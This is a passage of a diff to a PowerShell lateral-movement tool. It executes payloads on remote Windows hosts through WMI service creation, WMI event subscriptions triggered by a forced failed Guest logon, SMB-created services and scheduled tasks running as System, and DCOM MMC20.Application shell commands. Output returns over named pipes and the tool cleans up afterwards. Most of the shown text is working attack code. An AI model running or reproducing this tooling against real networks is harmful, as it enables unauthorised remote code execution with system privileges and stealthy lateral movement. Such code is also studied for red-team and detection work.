         }
-        $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
-        $command = '%COMSPEC% /c powershell -NoP -NonI -C "' + $delivery.Loader + '"'
-        $serviceName = [guid]::NewGuid().Guid
-    }
-    Process {
-        try  {
-            Write-Verbose "[CIMEXEC] Creating service $serviceName"
+        try {
+            Write-Verbose "[$computerName] Creating service $ServiceName..."
             $result = Invoke-CimMethod -ClassName Win32_Service -MethodName Create -Arguments @{
                 StartMode = 'Manual'
                 StartName = 'LocalSystem'
                 ServiceType = ([Byte] 16)
                 ErrorControl = ([Byte] 1)
-                Name = $serviceName
-                DisplayName = $serviceName
+                Name = $ServiceName
+                DisplayName = $ServiceName
                 DesktopInteract  = $false
                 PathName = $command
-            } -CimSession $cimSession -Verbose:$false
+            } -CimSession $session -Verbose:$false
 
             if ($result.ReturnValue -eq 0) {
-                Write-Verbose "[CIMEXEC] Running command: $command"
-                $service = Get-CimInstance -ClassName Win32_Service -Filter "Name='$serviceName'" -CimSession $cimSession -Verbose:$false
+                Write-Verbose "[$computerName] Running command..."
+                Write-Debug "$command"
+                $service = Get-CimInstance -ClassName Win32_Service -Filter "Name='$ServiceName'" -CimSession $session -Verbose:$false
                 Invoke-CimMethod -MethodName StartService -InputObject $service -Verbose:$false | Out-Null
                 do {
                     Start-Sleep -Seconds 1
-                    $service = Get-CimInstance -ClassName Win32_Service -Filter "Name='$serviceName'" -CimSession $cimSession -Verbose:$false
+                    $service = Get-CimInstance -ClassName Win32_Service -Filter "Name='$ServiceName'" -CimSession $session -Verbose:$false
                 }
                 until ($service.ExitCode -ne 1077 -or $service.State -ne 'Stopped')
 
-                Write-Verbose "[CIMEXEC] Removing service $serviceName"
+                Write-Verbose "[$computerName] Removing service $ServiceName..."
                 Invoke-CimMethod -MethodName Delete -InputObject $service -Verbose:$false | Out-Null
             }
             else {
-                Write-Warning "[$ComputerName] Service creation failed ($($result.ReturnValue))."
+                Write-Warning "[$computerName] Service creation failed ($($result.ReturnValue))."
             }
         }
         catch {
-            Write-Warning "[$ComputerName] Execution failed. $_"
+            Write-Warning "[$computerName] Execution failed. $_"
         }
-    }
-    End {
-        Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
-        Remove-CimSession -CimSession $cimSession
+        finally {
+            Write-Host "`n[$computerName] Execution finished."
+            Invoke-CimRecovery -CimSession $session -DefaultValue $delivery.OriginalValue
+        }
     }
 }
 
@@ -1002,90 +816,80 @@ Function Local:Invoke-CimSubscription {
         [ScriptBlock]
         $ScriptBlock,
 
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $ComputerName = $env:COMPUTERNAME,
+        [Parameter(Mandatory = $True)]
+        [CimSession[]]
+        $CimSession,
 
         [ValidateNotNullOrEmpty()]
-        [Management.Automation.PSCredential]
-        [Management.Automation.Credential()]
-        $Credential = [Management.Automation.PSCredential]::Empty,
-
         [String]
-        $Authentication = 'Default',
+        $FilterName = [guid]::NewGuid().Guid,
 
-        [ValidateSet('Dcom', 'Wsman')]
+        [ValidateNotNullOrEmpty()]
         [String]
-        $Protocol = 'Dcom',
+        $ConsumerName = [guid]::NewGuid().Guid,
 
         [Int]
-        $Timeout = 3,
-
-        [Int]
-        $Sleep = 60
+        $Sleep = 10
     )
-
-    Begin {
+    foreach ($session in $cimSession) {
+        $computerName = $session.ComputerName
         try {
-            $cimOption = New-CimSessionOption -Protocol $Protocol
-            if ($Credential.Username) {
-                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -ErrorAction Stop -Verbose:$false
-            }
-            else {
-                $cimSession = New-CimSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -ErrorAction Stop -Verbose:$false
-            }
+            $delivery = Invoke-CimDelivery -CimSession $session -ScriptBlock $ScriptBlock
+            $command = 'powershell.exe -NoP -NonI -C "' + $delivery.Loader + '"'
         }
         catch {
-            throw $_
+            Write-Verbose "[$computerName] Delivery failed. $_"
+            continue
         }
-        $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
-        $command = 'powershell.exe -NoP -NonI -C "' + $delivery.Loader + '"'
-        $filterName = [guid]::NewGuid().Guid
-        $consumerName = [guid]::NewGuid().Guid
-    }
-    Process {
-        try  {
-            Write-Verbose "[CIMEXEC] Creating event filter $filterName"
+        try {
+            Write-Verbose "[$computerName] Creating event filter $FilterName..."
             $filterParameters = @{
                 EventNamespace = 'root/CIMV2'
-                Name = $filterName
+                Name = $FilterName
                 Query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.LogFile='Security' AND TargetInstance.EventCode='4625'"
                 QueryLanguage = 'WQL'
             }
-            $filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Arguments $filterParameters -CimSession $cimSession -ErrorAction Stop -Verbose:$false
+            $filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Arguments $filterParameters -CimSession $session -ErrorAction Stop -Verbose:$false
 
-            Write-Verbose "[CIMEXEC] Creating event consumer $consumerName"
+            Write-Verbose "[$computerName] Creating event consumer $ConsumerName..."
             $consumerParameters = @{
-                Name = $consumerName
+                Name = $ConsumerName
                 CommandLineTemplate = $command
             }
-            $consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Arguments $consumerParameters -CimSession $cimSession -ErrorAction Stop -Verbose:$false
+            $consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Arguments $consumerParameters -CimSession $session -ErrorAction Stop -Verbose:$false
 
-            Write-Verbose "[CIMEXEC] Creating event to consumer binding"
+            Write-Verbose "[$computerName] Creating event to consumer binding..."
             $bindingParameters = @{
                 Filter = [Ref]$filter
                 Consumer = [Ref]$consumer
             }
-            $binding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Arguments $bindingParameters -CimSession $cimSession -ErrorAction Stop -Verbose:$false
+            $binding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Arguments $bindingParameters -CimSession $session -ErrorAction Stop -Verbose:$false
 
-            Write-Verbose "[CIMEXEC] Running command: $command"
-            New-CimSession -ComputerName $ComputerName -Credential (New-Object Management.Automation.PSCredential("Guest",(New-Object Security.SecureString))) -Authentication $Authentication -SessionOption $cimOption -OperationTimeoutSec $Timeout -ErrorAction SilentlyContinue -Verbose:$false
+            Write-Verbose "[$computerName] Running command..."
+            Write-Debug "$command"
+            try {
+                $cimOption = New-CimSessionOption -Protocol Dcom
+                New-CimSession -ComputerName $ComputerName -Credential (New-Object Management.Automation.PSCredential("Guest",(New-Object Security.SecureString))) -Authentication Default -SessionOption $cimOption -OperationTimeoutSec 10 -ErrorAction SilentlyContinue -Verbose:$false
+            }
+            catch {
+                Write-Warning "[$computerName] Trigger failed."
+            }
 
-            Write-Verbose "[CIMEXEC] Waiting for $Sleep seconds"
+            Write-Verbose "[$computerName] Waiting for $Sleep seconds..."
             Start-Sleep -Seconds $Sleep
 
-            Write-Verbose "[CIMEXEC] Removing event subscription"
+            Write-Verbose "[$computerName] Removing event subscription..."
             $binding | Remove-CimInstance -Verbose:$false
             $consumer | Remove-CimInstance -Verbose:$false
             $filter | Remove-CimInstance -Verbose:$false
         }
         catch {
-            Write-Warning "[$ComputerName] Execution failed. $_"
+            Write-Warning "[$computerName] Execution failed. $_"
         }
-    }
-    End {
-        Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
-        Remove-CimSession -CimSession $cimSession
+        finally {
+            Write-Host "`n[$computerName] Execution finished."
+            Invoke-CimRecovery -CimSession $session -DefaultValue $delivery.OriginalValue
+        }
     }
 }
 
@@ -1113,7 +917,6 @@ function Local:Invoke-SmbService {
         [String]
         $ServiceName = [guid]::NewGuid().Guid
     )
-
     Begin {
         if ($Credential.UserName) {
             $logonToken = Invoke-UserImpersonation -Credential $Credential
@@ -1170,67 +973,66 @@ function Local:Invoke-SmbService {
         $script = $script -creplace '(?m)^\s*\r?\n',''
         $payload = [char[]] $script
     }
-
     Process {
-        Write-Verbose "[SMBEXEC] Opening service manager"
+        Write-Verbose "[$ComputerName] Opening service manager..."
         $managerHandle = $OpenSCManagerA.Invoke("\\$ComputerName", "ServicesActive", 0xF003F)
         if ((-not $managerHandle) -or ($managerHandle -eq 0)) {
             throw $GetLastError.Invoke()
         }
 
-        Write-Verbose "[SMBEXEC] Creating new service: '$ServiceName'"
+        Write-Verbose "[$ComputerName] Creating $ServiceName..."
         $serviceHandle = $CreateServiceA.Invoke($managerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, $command, $null, $null, $null, $null, $null)
         if ((-not $serviceHandle) -or ($serviceHandle -eq 0)) {
             $err = $GetLastError.Invoke()
-            Write-Warning "[SMBEXEC] CreateService failed, LastError: $err"
+            Write-Warning "[$ComputerName] CreateService failed, LastError: $err"
             break
         }
         $CloseServiceHandle.Invoke($serviceHandle) | Out-Null
 
-        Write-Verbose "[SMBEXEC] Opening the service"
+        Write-Verbose "[$ComputerName] Opening the service..."
         $serviceHandle = $OpenServiceA.Invoke($managerHandle, $ServiceName, 0xF003F)
         if ((-not $serviceHandle) -or ($serviceHandle -eq 0)) {
             $err = $GetLastError.Invoke()
-            Write-Warning "[SMBEXEC] OpenServiceA failed, LastError: $err"
+            Write-Warning "[$ComputerName] OpenServiceA failed, LastError: $err"
         }
 
-        Write-Verbose "[SMBEXEC] Starting the service"
+        Write-Verbose "[$ComputerName] Starting the service..."
         if ($StartServiceA.Invoke($serviceHandle, $null, $null) -eq 0){
             $err = $GetLastError.Invoke()
             if ($err -eq 1053) {
-                Write-Verbose "[SMBEXEC] Command didn't respond to start"
+                Write-Verbose "[$ComputerName] Command didn't respond to start."
             }
-            else{
-                Write-Warning "[SMBEXEC] StartService failed, LastError: $err"
+            else {
+                Write-Warning "[$ComputerName] StartService failed, LastError: $err"
             }
             Start-Sleep -Seconds 1
         }
 
-        Write-Verbose "[SMBEXEC] Connecting to named pipe server \\$ComputerName\pipe\$PipeName..."
+        Write-Verbose "[$ComputerName] Connecting to named pipe server \\$ComputerName\pipe\$PipeName..."
         $pipeTimeout = 10000 # 10s
         $pipeClient = New-Object IO.Pipes.NamedPipeClientStream($ComputerName, $PipeName, [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None, [Security.Principal.TokenImpersonationLevel]::Impersonation)
         $pipeClient.Connect($pipeTimeout)
-        Write-Verbose "[SMBEXEC] Delivering payload..."
+        Write-Verbose "[$ComputerName] Delivering payload..."
         $writer = New-Object IO.StreamWriter($pipeClient)
         $writer.AutoFlush = $true
         $writer.WriteLine($payload)
-        Write-Verbose "[SMBEXEC] Getting execution output..."
+        Write-Verbose "[$ComputerName] Getting execution output..."
         $reader = New-Object IO.StreamReader($pipeClient)
         $output = ''
         while (($data = $reader.ReadLine()) -ne $null) {
             $output += $data + [Environment]::NewLine
         }
+        Write-Host "`n[$ComputerName] Execution finished."
         Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
     }
-
     End {
         $reader.Dispose()
         $pipeClient.Dispose()
 
-        Write-Verbose "[SMBEXEC] Deleting the service"
+        Write-Verbose "[$ComputerName] Deleting the service..."
         if ($DeleteService.invoke($serviceHandle) -eq 0){
             $err = $GetLastError.Invoke()
-            Write-Warning "[SMBEXEC] DeleteService failed, LastError: $err"
+            Write-Warning "[$ComputerName] DeleteService failed, LastError: $err"
         }
         $CloseServiceHandle.Invoke($serviceHandle) | Out-Null
         $CloseServiceHandle.Invoke($managerHandle) | Out-Null
@@ -1265,7 +1067,6 @@ function Local:Invoke-SmbTask {
         [String]
         $TaskName = [guid]::NewGuid().Guid
     )
-
     Begin {
         if ($Credential.UserName) {
             $logonToken = Invoke-UserImpersonation -Credential $Credential
@@ -1294,23 +1095,20 @@ function Local:Invoke-SmbTask {
         $script = $script -creplace '(?m)^\s*\r?\n',''
         $payload = [char[]] $script
     }
-
     Process {
         try {
             $com = [Type]::GetTypeFromProgID("Schedule.Service")
             $scheduleService = [Activator]::CreateInstance($com)
         }
         catch {
-            Write-Error "[SMBEXEC] Failed to create COM instance."
-            break
+            throw $_
         }
 
         try {
             $scheduleService.Connect($ComputerName)
         }
         catch {
-            Write-Error "[SMBEXEC] Unable to access $ComputerName. $_"
-            break
+            throw $_
         }
         $scheduleTaskFolder = $scheduleService.GetFolder("\")
         $taskDefinition = $scheduleService.NewTask(0)
@@ -1326,35 +1124,40 @@ function Local:Invoke-SmbTask {
             $taskAction.HideAppWindow = $true
         }
         catch {}
-        Write-Verbose "[SMBEXEC] Registering scheduled task $TaskName..."
-        $registeredTask = $scheduleTaskFolder.RegisterTaskDefinition($TaskName, $taskDefinition, 6, 'System', $null, 5)
-        Write-Verbose "[SMBEXEC] Running scheduled task..."
+        Write-Verbose "[$ComputerName] Registering scheduled task $TaskName..."
+        try {
+            $registeredTask = $scheduleTaskFolder.RegisterTaskDefinition($TaskName, $taskDefinition, 6, 'System', $null, 5)
+        }
+        catch {
+            throw $_
+        }
+        Write-Verbose "[$ComputerName] Running scheduled task..."
         Write-Debug "powershell $arguments"
         $scheduledTask = $registeredTask.Run($null)
 
-        Write-Verbose "[SMBEXEC] Connecting to named pipe server \\$ComputerName\pipe\$PipeName..."
+        Write-Verbose "[$ComputerName] Connecting to named pipe server \\$ComputerName\pipe\$PipeName..."
         $pipeTimeout = 10000 # 10s
         $pipeClient = New-Object IO.Pipes.NamedPipeClientStream($ComputerName, $PipeName, [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None, [Security.Principal.TokenImpersonationLevel]::Impersonation)
         $pipeClient.Connect($pipeTimeout)
-        Write-Verbose "[SMBEXEC] Delivering payload..."
+        Write-Verbose "[$ComputerName] Delivering payload..."
         $writer = New-Object IO.StreamWriter($pipeClient)
         $writer.AutoFlush = $true
         $writer.WriteLine($payload)
-        Write-Verbose "[SMBEXEC] Getting execution output..."
+        Write-Verbose "[$ComputerName] Getting execution output..."
         $reader = New-Object IO.StreamReader($pipeClient)
         $output = ''
         while (($data = $reader.ReadLine()) -ne $null) {
             $output += $data + [Environment]::NewLine
         }
+        Write-Host "`n[$ComputerName] Execution finished."
         Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
     }
-
     End {
         $reader.Dispose()
         $pipeClient.Dispose()
 
         if ($scheduledTask) { 
-            Write-Verbose "[SMBEXEC] Unregistering scheduled task $TaskName..."
+            Write-Verbose "[$ComputerName] Unregistering scheduled task $TaskName..."
             $scheduleTaskFolder.DeleteTask($scheduledTask.Name, 0) | Out-Null
         }
 
@@ -1384,7 +1187,6 @@ function Local:Invoke-SmbDcom {
         [String]
         $PipeName = [guid]::NewGuid().Guid
     )
-
     Begin {
         Function Local:Invoke-UserProcess {
             [CmdletBinding()]
@@ -1456,10 +1258,9 @@ function Local:Invoke-SmbDcom {
         $script = $script -creplace '(?m)^\s*\r?\n',''
         $payload = [char[]] $script
     }
-
     Process {
         if ($Credential.UserName) {
-            Write-Verbose "[SMBEXEC] Running command..."
+            Write-Verbose "[$ComputerName] Running command..."
             Write-Debug "%COMSPEC% $arguments"
             $script = ''
             $script += '$obj = [Activator]::CreateInstance([Type]::GetTypeFromProgID(''MMC20.Application'', ''' + $ComputerName + '''));'
@@ -1468,8 +1269,7 @@ function Local:Invoke-SmbDcom {
                 Invoke-UserProcess -Credential $Credential -Command ('powershell.exe -NoP -NonI -C "' + $script.Replace('"','""') + '"')
             }
             catch {
-                Write-Error "[SMBEXEC] Unable to access $ComputerName. $_"
-                break
+                throw $_
             }
         }
         else {
@@ -1478,34 +1278,33 @@ function Local:Invoke-SmbDcom {
                 $obj = [Activator]::CreateInstance($com)
             }
             catch {
-                Write-Error "[SMBEXEC] Unable to access $ComputerName. $_"
-                break
+                throw $_
             }
-            Write-Verbose "[SMBEXEC] Running command..."
+            Write-Verbose "[$ComputerName] Running command..."
             Write-Debug "%COMSPEC% $arguments"
             $obj.Document.ActiveView.ExecuteShellCommand('%COMSPEC%', $null, $arguments, '7')
         }
 
-        Write-Verbose "[SMBEXEC] Connecting to named pipe server \\$ComputerName\pipe\$PipeName..."
+        Write-Verbose "[$ComputerName] Connecting to named pipe server \\$ComputerName\pipe\$PipeName..."
         if ($Credential.UserName) {
             $logonToken = Invoke-UserImpersonation -Credential $Credential
         }
         $pipeTimeout = 10000 # 10s
         $pipeClient = New-Object IO.Pipes.NamedPipeClientStream($ComputerName, $PipeName, [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None, [Security.Principal.TokenImpersonationLevel]::Impersonation)
         $pipeClient.Connect($pipeTimeout)
-        Write-Verbose "[SMBEXEC] Delivering payload..."
+        Write-Verbose "[$ComputerName] Delivering payload..."
         $writer = New-Object IO.StreamWriter($pipeClient)
         $writer.AutoFlush = $true
         $writer.WriteLine($payload)
-        Write-Verbose "[SMBEXEC] Getting execution output..."
+        Write-Verbose "[$ComputerName] Getting execution output..."
         $reader = New-Object IO.StreamReader($pipeClient)
         $output = ''
         while (($data = $reader.ReadLine()) -ne $null) {
             $output += $data + [Environment]::NewLine
         }
+        Write-Host "`n[$ComputerName] Execution finished."
         Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
     }
-
     End {
         $reader.Dispose()
         $pipeClient.Dispose()
